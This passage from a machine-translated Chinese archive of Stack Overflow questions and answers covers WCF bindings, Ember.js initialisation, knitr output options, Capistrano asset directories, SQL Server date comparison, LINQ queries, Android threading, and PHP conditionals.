                <binding name="myBindingConfiguration2" closeTimeout="00:02:00" />
                <binding closeTimeout="00:03:00" />  
            </basicHttpBinding>
        </bindings>
        <services>
            <!—- change to your namespace & contract details -->
            <service name="MyNamespace.myServiceType">
                <endpoint 
                 address="myAddress" binding="basicHttpBinding" 
                 bindingConfiguration="myBindingConfiguration1"
                 contract="MyContract"  />
                <endpoint 
                 address="myAddress2" binding="basicHttpBinding" 
                 bindingConfiguration="myBindingConfiguration2"
                 contract="MyContract" />
            </service>
        </services>
     </system.serviceModel>
</configuration> 
```

你可以[在这里获取更多信息](http://msdn.microsoft.com/en-us/library/ms733932.aspx)

您还可以配置 WCF 以将数据公开为 REST 协议 ( `WebHttpBinding`)。该选项限制了 WCF 的功率。如果您打算通过 javascript 使用 WCF，您可以尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T08:53:48.640

您可以采用的最佳方法是使用 WebHttpBinding 公开**RESTful WCF**服务，该服务专为可互操作的 xml、json 对话而设计。然后任何客户端都可以向端点发出 HTTP 请求并获得纯 REST 结果。这种技术的一个缺点是您必须熟悉此处描述的 WCF RESTful 编程模型[http://msdn.microsoft.com/en-us/magazine/dd315413.aspx](http://msdn.microsoft.com/en-us/magazine/dd315413.aspx)您可以找到关于这个话题在这里[http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/90716451-fd29-4917-a5ca-f7f3bcaa96c9](http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/90716451-fd29-4917-a5ca-f7f3bcaa96c9)

第二种方法，由于其简单性，您可能会更喜欢它，它是使用通过**PHP 内置 SoapClient**访问的 BasicHttpBinding 服务。有一个很好的来源说明了将 .Net 数据类型传输到 PHP 客户端。因此，您可以对数据使用相同的方法：[将对象数组从 WCF 传递到 PHP - 提取信息](https://stackoverflow.com/questions/8763980/passing-array-of-objects-from-wcf-to-php-extracting-the-info)请小心并正确设计具有 [DataContract]/[DataMember] 属性的数据协定类。

以下是 PHP WCF/BasicHttpIntegration 初学者：[https ://github.com/geersch/WcfServicesWithPhp5](https://github.com/geersch/WcfServicesWithPhp5)

**REST 与 SOAP** REST 限制 WCF 的能力并不是真的，它实际上对一些高级 WCF 功能确实如此，主要是因为 WebHttpBinding 的限制。但反过来，REST 比任何 RPC 协议（如 SOAP）更具互操作性。另外，在这种情况下，您可以获得轻量级 JSON 支持。因此，您的决定取决于您的需求和系统的整体要求/架构。同意，如果您只需要向几个客户端（特别是如果它是本地系统，而不是通过 Internet 发布）提供类似对象的数据集，那么为了简单起见，BasicHttpBinding/SOAP 最适合您。

还要提一件事，许多 Web 服务要么是 RESTful，要么正在转换为 REST。微软也是如此。这是直接将数据传递到客户端浏览器的最佳方式（JS 处理）。

# javascript - Ember JS 如何设置应用程序

> ID：13599754
> 
> 赞同：6
> 
> 时间：2012-11-28T07:15:14.313
> 
> 标签：javascript, model-view-controller, ember.js

我是 Ember 菜鸟，正在努力让它发挥作用；但是我对 App.initialize() 方法感到困惑。

如果我使用以下代码，它会引发错误（找不到对象 App）：

```
App = Ember.Application.extend()
App.initialize() 
```

但是，如果我使用以下代码；它说初始化被调用了两次。

```
App = Ember.Application.create()
App.initialize() 
```

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-28T12:31:49.580

`Application`不再提供`initialize`方法。相反，您应该使用[`Application#deferReadiness`](https://github.com/emberjs/ember.js/blob/master/packages/ember-application/lib/system/application.js#L338-L341)并[`Application#advanceReadiness`](https://github.com/emberjs/ember.js/blob/master/packages/ember-application/lib/system/application.js#L347-L353)结合。

从 Ember 的源代码中提取的示例：

```
App = Em.Application.create();
App.deferReadiness();

jQuery.getJSON("/auth-token", function(token) {
  App.token = token;
  App.advanceReadiness();
}); 
```

此外，检查[jsfiddle](http://jsfiddle.net/schawaska/ANcmF/)中的示例：

```
window.App = Em.Application.create();

App.deferReadiness();

window.setTimeout(function() {
  Em.TEMPLATES["application"] = Em.Handlebars.compile('<h1>App</h1> this is a template');
  App.advanceReadiness();
}, 1500); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-16T19:51:08.363

只需创建您的应用程序并让 Ember 对其进行初始化。

您需要做的就是：

```
App = Ember.Application.create() 
```

应用程序**不会**立即初始化。它至少会等待 DOM 准备就绪并等待定义其余类（通过等待控制权从当前执行的 JavaScript 返回给浏览器）。

如果您想因其他原因推迟它，请执行以下操作：

```
App.deferReadiness();
$.getJSON("/boot", function() { App.advanceReadiness(); }); 
```

这将等待启动应用程序，直到`/boot`Ajax 调用返回。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-28T08:30:24.517

首先，您必须了解 create() 和 extend() 之间的区别。简单的理解方法是 extend() 方法只是扩展了 Ember.Application 的类，而 create() 方法创建了 Ember.Application() 的实例。在创建实例时，它运行构造函数。有 3 种方法可以创建 Ember.App 并运行它。

1

```
var App= Ember.Application.extend()
App.initialize() 
```

2.

```
var App = Ember.Application.create() 
```

这会在您创建对象后立即初始化。

3

```
var App= Ember.Application.extend()
App.create() 
```

要了解更多 Ember 对象，请通过此链接。[了解 Ember.Object](http://www.cerebris.com/blog/2012/03/06/understanding-ember-object/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-28T08:12:22.777

看看这里如何做这些事情：

[http://emberjs.com/documentation/#toc_creating-a-namespace](http://emberjs.com/documentation/#toc_creating-a-namespace)

如何引导：

```
window.App = Ember.Application.create(); 
```

在没有使用过 ember.js 的情况下，我建议 create 和 initialize 都进行初始化，这就是为什么你得到后一个错误告诉你它被初始化了两次。

而您的第一个版本正在尝试扩展 Application 对象，即您创建新功能。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-09-05T12:26:32.050

Ember "create" method accepts either no arguments, or an object containing values to initialize the newly instantiated object with, so you might also go like this below:

```
 var appConfig = {
        Token: token;
    };

 App = Ember.Application.create(appConfig); 
```

# r - 在 knitr 块内的循环中评估 LaTeX 语法并调整绘图 dpi

> ID：13599755
> 
> 赞同：2
> 
> 时间：2012-11-28T07:15:15.113
> 
> 标签：r, latex, knitr

对不起，如果这个问题很愚蠢。我正在尝试运行回归并将汇总表和诊断图发送到 PDF 文件。我发现这个包非常有用，但有两个基本问题。

1.  我可以使用 LaTeX 格式化块内的页面吗？
2.  有没有办法减小绘图的大小（我需要减小 pdf 文件的大小）？我尝试设置 dpi 并使用 png 而不是 plot，但没有成功。

感谢您的任何建议。

这是我的代码：

```
\documentclass[10pt]{article}
\usepackage{graphicx}
\usepackage{amssymb}
\usepackage{amsmath}
\usepackage{setspace}
\usepackage[margin = 1in]{geometry}

\begin{document}
\SweaveOpts{concordance=TRUE}
\section{Risk $\sim$ log(Parameters)}
<<fig.width=5,  fig.height=4.5, message=FALSE, tidy=TRUE, fig.align="center", echo=FALSE, warning=FALSE, eval=TRUE>>=
library(R.matlab)
for (k in 1:6){
data_t=readMat("I:\\Dropbox\\Rregression\\matlab_size.mat")

data=data.frame(NA, nrow = length(data_t[[1]]), ncol = 7)
data=data.frame(rho=data_t[[1]],Risk=data_t[[2]],Mass.f=data_t[[3]],Mass.utf=data_t[[4]],Mass.w=data_t[[5]],
                ach=data_t[[6]],p=data_t[[7]])

data2=log(subset(data,select=-c(Risk)))
N_reg=dim(data2)[2]
num_ele=k
Comb=combn(N_reg,num_ele)
N_comb=ncol(Comb)
Results=data.frame(NA,ncol=4,nrow=N_comb)
TSS=sum((data$Risk-mean(data$Risk))^2)

for (i in 1:N_comb){  
  data_temp=data2[,Comb[,i]]  
  lm_temp=lm(data$Risk~as.matrix(data_temp))
  name=paste("lm_", i, sep="")
  assign(name, lm_temp)
  Results[i,1]=summary(lm_temp)$r.squared
  Results[i,2]=summary(lm_temp)$adj.r.squared
  Results[i,3]=sum(resid(lm_temp)^2)
  Results[i,4]=sum((fitted(lm_temp)-mean(fitted(lm_temp)))^2)
} 
colnames(Results)=c("R2", "Adj_R2", "RSS", "ESS")
best_col=which(Results[,2]==max(Results[,2]))

cat ('Number of independent variables=', k)
print (summary(eval(parse(text=(paste("lm_", best_col, sep=""))))))
print (Results[best_col,])
par(mfrow=c(2,2),mar=c(3,3,3,3))
plot(eval(parse(text=(paste("lm_", best_col, sep=""))))) #question 2: is there a way to reduce dpi of plot? 
\newpage #Here is question 1, I want to add a page break after printing a pair of summary table and plots
}

@
\end{document} 
```

### 更新

当您在块中涉及循环时发现格式问题。根据易辉的建议，我跑了

```
library(devtools)
install_github('evaluate', 'hadley')
install_github('knitr', 'yihui') 
```

在 R 控制台中。但是，遇到了与小插图相关的以下错误：

```
* installing the package to re-build vignettes
* creating vignettes ... ERROR
C:/PROGRA~1/R/R-215~1.1/bin/Rscript -e "library(knitr); knit2pdf('knitr-intro.Rnw')"
/usr/bin/sh: -c: line 0: syntax error near unexpected token `('
/usr/bin/sh: -c: line 0: `C:/PROGRA~1/R/R-215~1.1/bin/Rscript -e \library(knitr); knit2pdf(knitr-intro.Rnw)\'
make: *** [knitr-intro.pdf] Error 1
Error in tools::buildVignettes(dir = ".") : running 'make' failed
Execution halted
Error: Command failed (1)
In addition: Warning message:
running command '"C:/PROGRA~1/R/R-215~1.1/bin/x64/R" --vanilla CMD build "C:\Users\th\AppData\Local\Temp\RtmpSMRGAq\yihui-knitr-568a092" --no-manual --no-resave-data' had status 1 
```

那么，关于如何解决这个问题的任何建议？我已经安装了 MikTex 2.9，并尝试直接从 Git 下载 Knitr 包并在 Windows shell 中构建。我有以下错误：

```
C:\Users\th\Documents\R\win-library\2.15>R CMD build knitr --no-vignettes
* checking for file 'knitr/DESCRIPTION' ... OK
* preparing 'knitr':
* checking DESCRIPTION meta-information ... OK
Warning in file(con, "r") :
  cannot open file 'man': No such file or directory
Error in file(con, "r") : cannot open the connection
 ERROR
computing Rd index failed 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-28T08:49:04.377

您可以大大简化您的示例。两个问题的答案（详细文档见[http://yihui.name/knitr/options ）：](http://yihui.name/knitr/options)

1.  是的，使用`results='asis'`；
2.  如果要使用`png`设备，可以将`dpi`chunk设置小一些；R 的`pdf()`设备已经压缩了绘图，`png`如果默认的 PDF 压缩对您不满意，它可能是唯一的选择；默认`dpi`值为 72，我认为较小的值不会有很大帮助

这是一个最小的例子：

```
\documentclass{article}

\begin{document}

hi

<<output-tex, results='asis'>>=
x = rnorm(1000)
cat('\\newpage')
@

here is a plot

<<smaller-png, dev='png', dpi=30>>=
plot(x)
@

\end{document} 
```

# ruby-on-rails - ckeditor assets 目录在运行 cap deploy 时被删除

> ID：13599756
> 
> 赞同：1
> 
> 时间：2012-11-28T07:15:21.370
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.2, capistrano

我正在将 ckeditor 用于微博应用程序，并且每次运行`cap deploy`ckditor 目录都会被删除。我该如何解决这个问题，以便我可以在不删除我的 vps 服务器上的 ckeditor 资产目录的情况下运行 cap deploy。

我的 deploy.rb 在下面。

```
set :whenever_command, "bundle exec whenever"
require "bundler/capistrano"
require "whenever/capistrano"

server "xxx.xx.xx.xxx", :web, :app, :db, primary: true

set :application, "cf"
set :user, "deployer"
set :deploy_to, "/home/#{user}/apps/#{application}"
set :deploy_via, :remote_cache
set :use_sudo, false

set :scm, "git"
set :repository, "git@github.com:ramza1/#{application}.git"
set :branch, "master"

default_run_options[:pty] = true
ssh_options[:forward_agent] = true

after "deploy", "deploy:cleanup" # keep only the last 5 releases

namespace :deploy do
  %w[start stop restart].each do |command|
    desc "#{command} unicorn server"
    task command, roles: :app, except: {no_release: true} do
      run "/etc/init.d/unicorn_#{application} #{command}"
    end
  end

  task :setup_config, roles: :app do
    sudo "ln -nfs #{current_path}/config/nginx.conf /etc/nginx/sites-enabled/#{application}"
    sudo "ln -nfs #{current_path}/config/unicorn_init.sh /etc/init.d/unicorn_#{application}"
    run "mkdir -p #{shared_path}/config"
    put File.read("config/database.example.yml"), "#{shared_path}/config/database.yml"
    puts "Now edit the config files in #{shared_path}."
  end
  after "deploy:setup", "deploy:setup_config"

  task :symlink_config, roles: :app do
    run "ln -nfs #{shared_path}/config/database.yml #{release_path}/config/database.yml"
  end
  after "deploy:finalize_update", "deploy:symlink_config"

  desc "Make sure local git is in sync with remote."
  task :check_revision, roles: :web do
    unless `git rev-parse HEAD` == `git rev-parse origin/master`
      puts "WARNING: HEAD is not the same as origin/master"
      puts "Run `git push` to sync changes."
      exit
    end
  end
  before "deploy", "deploy:check_revision"
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-08-13T07:56:05.233

如果您使用的是 Capistrano 3，请添加`public/ckeditor_assets`到共享目录并添加符号链接：

```
set :linked_dirs, %w{log tmp/pids tmp/cache tmp/sockets vendor/bundle public/system public/ckeditor_assets} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:38:07.330

1.  您必须将带有资产的目录复制到共享路径。
2.  您必须使用 capistrano 从发布路径创建一个符号链接，该链接指向带有 ckeditor 资产的目录

这是我做的帽子：

```
after "deploy:update_code" do
  run "ln -s #{shared_path}/uploads #{release_path}/public/uploads"
end 
```

# sql - 无法将日期时间转换为时间并将其与另一个日期进行比较

> ID：13599757
> 
> 赞同：0
> 
> 时间：2012-11-28T07:15:27.747
> 
> 标签：sql, sql-server-2005

我面临一个奇怪的问题，我不明白出了什么问题。在我的数据库中，我有一个`datetime`字段，其中保留了一些值，例如：`03.10.2012 11:25:06` 我需要将其转换为`date`另一个日期并将其与另一个日期进行比较。我没有成功的尝试是：

```
p1.value as City,
p2.value as Country,
p3.value as RequestNumber,
convert (datetime, convert (varchar, test.timestampmin, 101), 101) as timestampmin

from Process p
LEFT JOIN Parameter p1 on p1.ID=p.id AND p1.NAME = 'City'
LEFT JOIN Parameter p2 on p2.ID=p.id AND p2.NAME = 'Country'
LEFT JOIN PA_Parameter p3 on p3.ID=p.id AND p3.NAME = 'RequestNumber'

INNER JOIN
(
    SELECT min(Timestamp) as timestampmin, id as id
    FROM tasks
    GROUP BY id
) as test 
    ON test.id = p3.ID

where p.type='Event' and 
timestampmin = convert (datetime, convert (varchar, '06.18.2012', 101), 101) 
```

问题是我无法将转换`datetime`后的值与`convert (datetime, convert (varchar, '06.18.2012', 101), 101)`我在 where 子句中使用的值进行比较。

我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:30:58.397

很简单，您不能在同一查询的 WHERE 子句中访问 SELECT 子句中的列别名。

```
p1.value as City,
p2.value as Country,
p3.value as RequestNumber,
convert (datetime, convert (varchar, test.timestampmin, 101), 101) as timestampmin

from Process p
LEFT JOIN Parameter p1 on p1.ID=p.id AND p1.NAME = 'City'
LEFT JOIN Parameter p2 on p2.ID=p.id AND p2.NAME = 'Country'
LEFT JOIN PA_Parameter p3 on p3.ID=p.id AND p3.NAME = 'RequestNumber'

INNER JOIN
(
    SELECT min(Timestamp) as timestampmin, id as id
    FROM tasks
    GROUP BY id
) as test 
    ON test.id = p3.ID

where p.type='Event' and 
convert (datetime, convert (varchar, test.timestampmin, 101), 101)
   = convert (datetime, convert (varchar, '06.18.2012', 101), 101) 
```

如果`test.timestampmin`是日期时间列，则可以在 WHERE 子句中使用它

```
where p.type='Event'
  and test.timestampmin >= '20120618'
  and test.timestampmin <  '20120619' 
```

# facebook-graph-api - Facebook PHP SDK 的 Getuser() 方法总是返回 0

> ID：13599758
> 
> 赞同：0
> 
> 时间：2012-11-28T07:15:34.723
> 
> 标签：facebook-graph-api

**问题：**我无法从 Facebook 的 getuser() 方法获取用户 ID。

**描述：**我创建了一个 Facebook 应用程序。保存更改后，我已将站点 URL 指定为“ [http://localhost:8088/fb/ ”。](http://localhost:8088/fb/)现在我想获取用户 ID，以便我可以访问 Facebook 上的用户信息。

下面是我的代码：

```
 <?php
require 'facebook.php';

$facebook = new Facebook(array(
  'appId'  => 'xxxxxxxxxxx',
  'secret' => 'xxxxxxxxxxxxxxxxxx',
));

$user = $facebook->getUser();
 echo $user;
if($user)
{
 $logoutUrl = $facebook->getLogoutUrl();
 }
 else
{
 $logoutUrl=$facebook->getLoginUrl();
}
 ?>
 <!doctype html>
 <html xmlns:fb="http://www.facebook.com/2008/fbml">
 <head>
<title>php-sdk</title>
 </head>
<body>
 <?php if($user )
  {
?>
 <a href="<?php echo $logoutUrl; ?>">Logout</a>
 <?php
  }
 else
 {
 ?>
<a href="<?php echo $loginUrl; ?>">Login</a>
<?php
  } 
  ?>
   </body>
   </html> 
```

登录 Facebook 后，我的用户 ID 为 0。我需要执行什么设置吗？我已经搜索了许多解决方案，但没有任何效果。如何获取用户 ID？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:19:30.720

我对 PHP 了解不多，但原因可能是其中之一：

1.  您没有验证您的应用程序。
2.  您正在从 localhost 运行应用程序，并在图形 API 中提供了您的域或其他名称的名称。
3.  您的访问令牌已过期。

# c# - 枚举继承解决方案

> ID：13599762
> 
> 赞同：5
> 
> 时间：2012-11-28T07:15:51.057
> 
> 标签：c#, inheritance, enums

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:23:18.570

# c# - LINQ：单个谓词中的多个 LIKE 子句

> ID：13599766
> 
> 赞同：1
> 
> 时间：2012-11-28T07:16:13.820
> 
> 标签：c#, sql, linq, entity-framework, linq-to-sql

我想做一个 LINQ 查询，可以将多个变量与单个字符串进行比较。我已经看到[LINQ for LIKE queries of array elements](https://stackoverflow.com/questions/698379/linq-for-like-queries-of-array-elements)，它很有帮助，但并不完全。我需要反过来。

我想做的是以下几点：假设我有一个`Company`对象同时具有`Name`and `Address`。我也有一个字符串`keyword`。然后，我想`Company`在一个列表中找到所有 s 中`keyword`的`Name`or `Address`。在 SQL 中，它将是...

```
SELECT * FROM Company
WHERE Name LIKE '%keyword%' OR Address LIKE '%keyword%' 
```

我一直在使用实体框架，并且尝试了以下方法：`context.Companies.Where(x => new string[] { x.Name, x.Address }.Contains(keyword)`，以及`context.Companies.Where(x => new string[] { x.Name, x.Address }.Any(r => r.Contains(keyword))`，但都没有成功。第一个给了我一个`IN`子句，第二个......我不知道它做了什么，但它没有给我我想要的东西。

对不起，我对 Expressions 的理解还不是很深入；我希望我能够从头开始编写自己的自定义表达式，但是*从头开始*我还不能……有人可以帮我吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T07:17:48.437

有什么理由不只是使用`||`运营商？

```
context.Companies.Where(x => x.Name.Contains(keyword) || 
                             x.Address.Contains(keyword)) 
```

我希望这会被翻译成你原来的 SQL。

# android - 如何在android中使用单线程类进行多个网络调用

> ID：13599769
> 
> 赞同：0
> 
> 时间：2012-11-28T07:16:22.073
> 
> 标签：android

我有两个按钮。我需要使用两个按钮进行两个不同的网络呼叫。但需要使用单线程通过。如果我使用下面的代码，线程类没有返回`json`响应。它返回`null`值。我该如何解决这个问题？

我的线程类：

```
public static json runDialogLogin(String URL) {

    JSONObject json;

    JSONParser jParser = new JSONParser();
    new Thread() {
        public void run() {
            try {
                // getting JSON string from URL
                json = jParser.getJSONFromUrl(URL);
            } catch (Exception e) {

                e.printStackTrace();
            }
        }

    }.start();
    return json;
} 
```

我的主要课程：

......

```
@Override
public final void onClick(final View v) {
    switch (v.getId()) {
        case R.id.button1:
            json= runDialogLogin("My URL1");
            if(json!=null){
                Intent i=new Intent(this,result1.class);
                startActivity(i);

                case R.id.button2:
                json= runDialogLogin("My URL2");
                if(json!=null){
                    Intent i=new Intent(this,result2.class);
                    startActivity(i);
                }
            }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T07:21:07.117

你的代码设计得很奇怪：

```
 JSONObject json = jParser.getJSONFromUrl(URL); 
```

和

```
 return json; 
```

不要使用相同的 json 对象，它们只是共享一个名称但不是同一个变量。第一个的范围仅限于您的运行方法。您无法在此范围之外获得有关它的参考。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:27:20.773

您正在启动`thread`并立即从线程返回结果。等到响应来自服务器，然后返回它。

代码应该像

```
new Thread() {
    public void run() {
        try {
            // getting JSON string from URL
            JSONObject json = jParser.getJSONFromUrl(URL);

            // wait till you get the response from the server and then return the json object here only.
            return json;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}.start(); 
```

# javascript - 在 Javascript 中使用 JSONRequest 设置 HTTP 标头

> ID：13599772
> 
> 赞同：0
> 
> 时间：2012-11-28T07:16:31.730
> 
> 标签：javascript, json, http-headers

我想使用 Javascript 中的 JSONRequest 对象为请求设置 http 标头。此外，如果有人能说出 JSONRequest 对象在所有现代浏览器中的可用性。

# c# - 通用控制器

> ID：13599773
> 
> 赞同：1
> 
> 时间：2012-11-28T07:16:34.333
> 
> 标签：c#, asp.net-mvc-3, generics, multiple-inheritance

我有多个具有一些常见操作的控制器。我制作了通用控制器：

```
 public class FirstBaseController<TEntity> where TEntity : class, IFirst, new()
 public class SecondBaseController<TEntity> where TEntity : class, ISecond, new() 
```

然后我想做这样的事情：

```
 public class MyController : FirstBaseController<First>, SecondBaseController<Second> 
```

而且我知道在 C# 中不允许多类继承。你能告诉我另一种方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:27:22.843

唯一的选择就是用接口代替基类，通过组合实现复用：

```
public interface IMyFirstSetOfMethods<TEntity> { /*... */ }
public interface IMySecondSetOfMethods<TEntity> { /*... */}

public class FirstImpl 
{

}

public class SecondImpl
{
}

public class MyController : IMyFirstSetOfMethods<First> , IMySecondSetOfMethods<Second>
{
    FirstImpl myFirstImpl = new FirstImpl();
    SecondImpl mySecondImpl = new SecondImpl();

    // ... implement the methods from the interfaces by simply forwarding to the Impl classes
} 
```

# java - 如何使用 java swing 录制直播视频

> ID：13599774
> 
> 赞同：2
> 
> 时间：2012-11-28T07:16:40.450
> 
> 标签：java, video, stream, recording

我想知道是否可以使用 Java swing satndalone 应用程序记录和保存实时流。如果可以，请提供一些示例。

认为流 URL 是 mms://192.168.2.1:7700 ，我想在播放的同时保存视频。因此感谢帮助。

# javascript - HTML5/Javascript 在屏幕上以一定角度移动对象

> ID：13599781
> 
> 赞同：6
> 
> 时间：2012-11-28T07:17:04.093
> 
> 标签：javascript, html, canvas

在过去一年左右的时间里，我一直在熟悉 Javascript，为了真正彻底地学习这门语言，我决定制作一个 HTML5 游戏！我遇到的问题是我完全不知道如何在屏幕上平滑地以一定角度移动图像。我可以通过将它在 x 轴上/下移动一个像素并在 y 轴上/下移动一个像素来将它移动到 45 度角，但这还不够具体。我将如何以非常特定的角度移动它？在我看来，必须有一个函数将它四舍五入到最近的像素？

不完全确定...任何解决方案都可以正常工作，尽管首选非图书馆特定的解释！

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:20:36.820

您要查看的是[线性插值](https://stackoverflow.com/questions/9762877/html5-js-how-to-animate-straight-line-between-two-coordinates)（或`lerp`）的 javascript 实现。另一个名字是`motion tween`，但我相信这更像是一个动画术语，而不是游戏开发。

这个想法是你有两个坐标，开始和结束，以及动画发生的时间，你使用线性插值在两者之间制作动画。

从链接的堆栈问题中，[本文](http://paulirish.com/2011/requestanimationframe-for-smart-animating/)解释了一个允许您进行插值的浏览器实现。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:21:37.830

首先，如果您使用 HTML5 制作游戏，您应该尝试使用[Canvas 元素](https://developer.mozilla.org/en-US/docs/HTML/Canvas)。在 Canvas 中绘制所有游戏，而不是操纵 DOM 元素。话虽如此，移动图像（在画布内或图像标签内）的原理是用 sin/cos + 距画布/窗口左上角的距离来计算位置。

例子：

```
160° (South by South-East, give or take), distance 130 pixels.
sin(160)*130
  = 44.462619
cos(160)*130
  = -122.160041 
```

--> 左上角位于 x=44，y=122（因为 0:0 左下坐标系中的 44:-122 转换为 0:0 左上坐标系中的 44:122）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:21:44.780

你将需要三角函数:) 例如，如果你想将对象移动到鼠标光标，那么你有对象坐标和鼠标坐标，你应该计算 X 和 Y 步长（对不起我的英语）

# php - PHP if (变量)

> ID：13599782
> 
> 赞同：5
> 
> 时间：2012-11-28T07:17:08.250
> 
> 标签：php

在各种 PHP 教程中，我看到了这种语法 -

```
if ($_POST) {
  do something
} 
```

我想知道这是否等同于 isset 或 !(empty) （任何一个）或具有不同的属性。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-28T07:23:22.600

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T07:24:33.827

```
if ($_POST) 
```

如果 POST 数组中有任何元素，这将评估为 true。

```
if(isset($_POST)) 
```

这将始终评估为 true，因为始终设置 POST 数组，但可能包含也可能不包含元素，因此它不等同于第一个示例。

```
if(!empty($_POST)) 
```

然而，这等效于第一个示例，因为`empty()`检查数组中的内容。

测试页面是否发布到的一个很好的通用方法是：

```
if($_SERVER['REQUEST_METHOD'] == 'POST') 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-28T07:56:12.067

好问题。如果你问我，你正在解决 PHP 的黑暗面之一。

**if 语句** 就像我可以想象的任何其他语言一样，if 将参数评估为真或假。

由于 PHP 并不真正知道类型，您可以将任何表达式作为参数，然后将其作为一个整体转换为 bool

以下值被认为是“假”

*   布尔值 FALSE
*   整数 0
*   浮动 0.0
*   空字符串
*   字符串“0”
*   任何元素为零的数组
*   NULL 例如未设置的变量或 $var = null
*   从空标签创建的 SimpleXML 对象

所有其他值或表达式结果都被转换为 bool TRUE

现在，知道了这一点，我们需要知道的是，表达式或函数在执行时返回什么

如果未设置 POST 数据，则以下表达式为 TRUE

```
$_POST == FALSE 
```

**isset 函数**

当给定变量已设置且不为空时，isset 返回 bool TRUE。

参数可以是变量、数组元素、字符串偏移量和对象的数据成员。

在 PHP 5.4 中，他们修复了字符串偏移的行为

```
$var = FALSE;

isset( $var ) === TRUE;
$var === FALSE; 
```

更多在这里 [http://de1.php.net/manual/en/function.isset.php](http://de1.php.net/manual/en/function.isset.php)

**空函数**

当变量被认为为空或不存在时返回 false。

这些值被认为是空的：

如果 var 存在并且具有非空、非零值，则返回 FALSE。否则返回 TRUE。

以下值被认为是空的：

*   ""（空字符串）
*   0（整数）
*   0.0（浮点数）
*   “0”（字符串）
*   无效的
*   错误的
*   数组（）（空数组）
*   没有值的声明变量也是空的

比较表

```
$var = FALSE;

isset($var) === TRUE;
empty($var) === TRUE;
$var === FALSE; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-28T07:23:04.563

`$_POST`：这用于查找是否使用 HTTP POST 方法传递数据，并提取通过该方法发送的变量，这些变量收集在关联数组中

`isset`：检查变量是设置（定义）还是`NULL`（未定义）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-28T07:35:04.973

如果要检查变量的值但不确定是否已设置，最佳做法是执行以下操作：

```
if(isset($var) && $var) { ... } 
```

即检查`isset()`然后检查变量值本身。

这样做的原因是，如果您只是检查变量本身，根据您问题中的示例，如果未设置变量，PHP 将引发警告。警告消息不是致命错误，消息文本可以被隐藏，但通常最好的做法是编写代码，使其不会引发任何警告。

调用`isset()`只会告诉你是否设置了变量；它不会告诉您有关变量值的任何信息，因此您不能单独依赖它。

希望有帮助。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-28T07:33:59.967

[PHP.net](http://php.net)是一个非常宝贵的信息来源，可用于找出该语言的复杂性和怪癖。

话虽如此，这些并不等同。if 语句将表达式转换为布尔值（有关被认为是错误的信息，请参见[此处）。](http://php.net/manual/en/language.types.boolean.php)

[isset](http://php.net/manual/en/function.isset.php)用于“确定变量是否已设置且不为 NULL”。

[empty](http://php.net/manual/en/function.empty.php)确定变量是否为空，即“它不存在或者它的值是否等于 FALSE”。

# android - am_proc_died : [23031,com.android.browser,9] 浏览器应用程序自动关闭

> ID：13599786
> 
> 赞同：2
> 
> 时间：2012-11-28T07:17:36.050
> 
> 标签：android

在那种情况下，浏览器使用 45753 KB 内存。对我来说，OOM 看起来有问题。您能否对此进行确认，并请让我知道 am_proc_died 的参数 int 的意义：[PID,Package Name, int]

45753 kB：前景 45753 kB：com.android.browser（pid 23031）

# javascript - 使用 javascript/Jquery 动态更改 struts 选择标记的来源

> ID：13599796
> 
> 赞同：0
> 
> 时间：2012-11-28T07:18:14.680
> 
> 标签：javascript, jquery, struts2

在我的代码中，我有一个 Struts2 选择标签（`<s:select>`）。它的内容如下：

```
<s:select id="s" list="list" listKey="id" listValue="displayValue"> 
```

在用户做出的某些选择中，我想将`list`attibute 的值更改为指向其他列表。（可能使用 javascript/jquery）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T09:15:24.370

[你试过什么？](http://mattgemmell.com/2008/12/08/what-have-you-tried/)*

您至少有两种方法可以做到这一点：

1) 执行 AJAX 操作以获取新数据（例如，在 JSON 中，如 'id' 和 'description' 的列表）；然后用 Javascript 修改 HTML，从 中删除旧`Options`的，在`Select`中构建和添加新`Options`的`Select`，并最终更改一些`Select`属性；

2) 执行 AJAX 操作以获得一个全新的`Select`、精心设计的服务器端，以 HTML 片段（内部只有一个 JSP `<s:select>`）的形式返回；然后将其替换为页面上的原始内容，例如使用其容器（如 a `div`）作为 AJAX 操作的目标。

* * *

* @AshishGupta 建议我删除“你试过什么？” *保持语气积极的*部分。请阅读这篇文章，*必须*了解为什么对于不发布代码的提问者（首先是为了他们自己的利益），这应该始终是第一个（积极和合法的）问题。

希望这会有所帮助，就像我的其余答案一样。

# sql-server - SQL Server 服务器登录和数据库用户

> ID：13599805
> 
> 赞同：2
> 
> 时间：2012-11-28T07:18:44.213
> 
> 标签：sql-server

在工作中，我们使用 AD 组来控制对 SQL Server 数据库的访问。

